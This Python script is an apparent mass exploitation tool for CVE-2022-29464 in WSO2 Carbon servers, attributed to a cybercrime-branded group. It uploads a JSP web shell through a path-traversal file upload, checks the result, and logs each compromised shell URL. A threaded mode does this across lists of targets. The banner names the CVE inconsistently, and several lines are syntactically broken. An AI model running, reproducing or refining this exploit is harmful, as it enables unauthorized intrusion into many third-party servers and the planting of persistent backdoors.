import requests
import os
import urllib3
import concurrent.futures
from sys import stdout
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor
init(autoreset=True)
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if not os.path.exists('Results'):
    os.mkdir('Results')

os.system('clear' if os.name == 'posix' else 'cls')

def banners():
    os.system('clear' if os.name == 'posix' else 'cls')
    stdout.write("                                                                                         \n")
stdout.write(""+Fore.LIGHTRED_EX +"$$$$$$\   $$$$$$\   $$$$$$\      $$\      $$\ $$\     $$\ \n")
stdout.write(""+Fore.LIGHTRED_EX +"$$  __$$\ $$  __$$\ $$  __$$\     $$$\    $$$ |\$$\   $$  | \n")
stdout.write(""+Fore.LIGHTRED_EX +"$$ /  \__|$$ /  \__|$$ /  \__|    $$$$\  $$$$ | \$$\ $$  / \n)
stdout.write(""+Fore.LIGHTRED_EX +"\$$$$$$\  $$ |      $$ |          $$\$$\$$ $$ |  \$$$$  / \n")
stdout.write(""+Fore.LIGHTRED_EX +" \____$$\ $$ |      $$ |          $$ \$$$  $$ |   \$$  / \n")  
stdout.write(""+Fore.LIGHTRED_EX +"$$\   $$ |$$ |  $$\ $$ |  $$\     $$ |\$  /$$ |    $$ | \n")   
stdout.write(""+Fore.LIGHTRED_EX +"\$$$$$$  |\$$$$$$  |\$$$$$$  |$$\ $$ | \_/ $$ |    $$ | \n")  
stdout.write(""+Fore.LIGHTRED_EX +"\______/  \______/  \______/ \__|\__|     \__|    \__| \n")
                                                           
stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")      stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"CVE-2022-29469 Exploiter By             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   SamuraiMelayu1337 | SynixCyberCrimeMY                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/S4MURAIMELAYU1337                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"USING     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   pip3 install -r requirements.txt                                "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"Thanks To  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   All Member SynixCyberCrimeMY + Muslim Hackers                     "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n")                           print(f"{Fore.YELLOW}[CVE-2022-29464] - {Fore.GREEN}PERFORM WITH MASS EXPLOITS WSO2 CARBON SERVER\n")
banners()

def exploit(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Content-Type': 'application/json'} # .MF, .jspx, .jspf, .jsw, .jsv, xml, .war, .jsp, .aspx
        files = {"../../../../repository/deployment/server/webapps/authenticationendpoint/shell.jsp": open("Files/shell.jsp", "rb")}

        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=10, verify=False, files=files)

        if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
            print(f"{Fore.YELLOW}[CVE-2022-29464]{Fore.RED} .: {Fore.GREEN}[W00T!] {Fore.YELLOW}- {Fore.GREEN}{url}/authenticationendpoint/shell.jsp")
            with open('Results/Results.txt', 'a') as f:
                f.write(f"{url}/authenticationendpoint/shell.jsp\n")
        else:
            print(f"{Fore.YELLOW}[CVE-2022-29464]{Fore.YELLOW} .: {Fore.RED}[Failed!] {Fore.YELLOW}- {Fore.RED}{url}")
    except KeyboardInterrupt:
        print(f"{Fore.CYAN}KeyboardInterrupt{Fore.RESET}")


def single_scan():
    url = input(f"{Fore.YELLOW}[DOMAIN/IP] {Fore.RED}.: {Fore.WHITE}")
    if not url.startswith("http"):
        url = "https://" + url
    exploit(url)


def mass_scan():
    urls_file = input(f"{Fore.YELLOW}[DOMAIN/IP LIST] {Fore.RED}.: {Fore.WHITE}")
    if not os.path.isfile(urls_file):
        print(f"{Fore.RED}WHUT ARE YOU DOIN? FILE NOT FOUND!\n")
        return

    with open(urls_file, "r") as f:
        urls = f.read().splitlines()
    
    urls = [url if url.startswith("http") else "https://" + url for url in urls]

    try:
        max_threads = int(input(f"{Fore.YELLOW}[THREAD: 10-30] {Fore.RED}.: {Fore.WHITE}") or "10")

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            results = [executor.submit(exploit, url) for url in urls]
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[KeyboardInterrupt]{Fore.RESET}")


def main():
    print(f"{Fore.RED}[1] - {Fore.YELLOW}SINGLE SCAN")
    print(f"{Fore.RED}[2] - {Fore.YELLOW}MASSIVE SCAN\n")

    choice = input(f"{Fore.YELLOW}[CVE-2022-29464] {Fore.RED}.: ")
    if choice == "1":
        single_scan()
    elif choice == "2":
        mass_scan()
    else:
        print(f"{Fore.RED}WHUT ARE YOU DOIN? FILE NOT FOUND!")


if __name__ == '__main__':
    main()                           
                                                           
                                                           